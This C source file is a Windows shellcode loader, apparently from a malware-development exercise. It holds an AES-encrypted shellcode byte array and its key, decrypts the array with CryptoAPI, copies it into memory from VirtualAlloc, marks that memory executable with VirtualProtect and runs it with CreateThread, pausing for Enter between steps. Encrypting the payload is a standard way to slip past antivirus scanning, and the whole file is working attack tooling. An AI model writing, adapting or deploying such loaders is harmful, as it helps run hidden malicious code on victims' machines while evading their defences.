
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


int DecryptAES(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int main(void) {
    
	void * alloc_mem;
	BOOL retval;
	HANDLE threadHandle;
    DWORD oldprotect = 0;

	char encryption_key[] =  { 0x4, 0xa6, 0x32, 0x16, 0x20, 0x51, 0x4d, 0x86, 0x22, 0x6c, 0x4c, 0x47, 0xa2, 0x2d, 0xf1, 0x91 };
	unsigned char payload[] =  { 0x30, 0xea, 0xb3, 0x9c, 0x2e, 0xd3, 0xa9, 0xdc, 0xf6, 0x34, 0xe3, 0xcd, 0xe9, 0x97, 0xdc, 0xae, 0xe3, 0xe5, 0xfe, 0xd, 0x13, 0xaf, 0xc0, 0xe4, 0x7a, 0xe6, 0x90, 0xed, 0xfc, 0x8d, 0x9, 0x34, 0x45, 0x3e, 0xc5, 0x3, 0x41, 0x64, 0x89, 0xe5, 0x76, 0x70, 0x80, 0x20, 0xff, 0x15, 0xba, 0x5d, 0xd7, 0x2a, 0x5d, 0xd9, 0x16, 0x5f, 0x3, 0x87, 0xab, 0x9f, 0x2, 0xdb, 0x42, 0xe7, 0xa2, 0x96, 0xe2, 0x66, 0x6f, 0x83, 0xea, 0x80, 0xfd, 0xa4, 0xea, 0xcf, 0xa8, 0xfc, 0x92, 0x4c, 0x96, 0xac, 0x5e, 0xcd, 0x3f, 0xe1, 0xa8, 0x1c, 0xb, 0x6b, 0x61, 0x7e, 0x44, 0xba, 0x6e, 0x74, 0x49, 0x56, 0x7c, 0x88, 0x5, 0x15, 0xee, 0x26, 0x5, 0xde, 0xbb, 0x3a, 0x4b, 0x3c, 0x94, 0x47, 0xaf, 0x12, 0x60, 0x72, 0x57, 0xab, 0x33, 0xca, 0xf6, 0xcb, 0x22, 0xa0, 0x89, 0xa9, 0x47, 0x3f, 0x27, 0x41, 0x20, 0xab, 0x28, 0xfb, 0xb, 0x2, 0xe0, 0x2a, 0xb4, 0xc4, 0x66, 0xbc, 0x6b, 0xbe, 0xa2, 0xca, 0x8d, 0xe5, 0xcb, 0x65, 0x6f, 0x8b, 0xe7, 0x5e, 0x15, 0x66, 0xec, 0x6d, 0xdf, 0xfd, 0x27, 0xd9, 0x9f, 0xe4, 0x67, 0x6f, 0x14, 0xf0, 0xf5, 0xc2, 0x4f, 0x14, 0x6c, 0x3f, 0xe7, 0x41, 0xf7, 0xc6, 0x38, 0xbe, 0xe8, 0x57, 0x24, 0xf5, 0x1, 0x7a, 0xac, 0x48, 0x85, 0x25, 0xcd, 0x8, 0x4f, 0x21, 0x39, 0xd8, 0x51, 0x78, 0x8a, 0xc4, 0x98, 0x5f, 0xda, 0xa, 0x85, 0x42, 0x6a, 0x3, 0x86, 0x93, 0xe7, 0xf0, 0xc8, 0xc7, 0x64, 0x6a, 0xfa, 0x8e, 0x52, 0xad, 0xf3, 0x9d, 0xe3, 0x8, 0x67, 0x9d, 0x8d, 0x30, 0x65, 0xa0, 0xd7, 0xaf, 0xc9, 0x79, 0xd7, 0x84, 0x9f, 0x67, 0x6d, 0x1c, 0x1f, 0x24, 0xd, 0xdb, 0x59, 0x96, 0xc8, 0xca, 0x20, 0x29, 0x7a, 0xbc, 0x18, 0xf3, 0x5f, 0x2a, 0xc9, 0xdb, 0xf3, 0x3d, 0x46, 0x4f, 0x85, 0xad, 0x22, 0xe1, 0xe, 0x4e, 0xab, 0x47, 0x8, 0x46, 0x6c, 0x31, 0x4c, 0x86, 0x8c, 0x50, 0xf4, 0x46, 0xc, 0x62, 0x75, 0xa5, 0x6f, 0x35, 0x73, 0xc4, 0x6e, 0xe4 };

	


	unsigned int payload_length = sizeof(payload);
	
	// Allocate new memory buffer for payload
	alloc_mem = VirtualAlloc(0, payload_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "alloc_mem addr", (void *)alloc_mem);

	printf("\n[1] Press Enter to Decrypt XOR Payload\n");
	getchar();

	// Decrypt the AES payload to Original Shellcode
	DecryptAES((char *) payload, payload_length, encryption_key, sizeof(encryption_key));
	
	// Copy the decrypted payload to allocated memory
	RtlMoveMemory(alloc_mem, payload, payload_length);
	
	// Set the newly allocated memory to be executable
	retval = VirtualProtect(alloc_mem, payload_length, PAGE_EXECUTE_READ, &oldprotect);

	printf("\n[2] Press Enter to Create Thread\n");
	getchar();

	// If VirtualProtect succeeded, run the thread that contains the shellcodePayload
	if ( retval != 0 ) {
			threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) alloc_mem, 0, 0, 0);
			WaitForSingleObject(threadHandle, -1);
	}

	return 0;
}
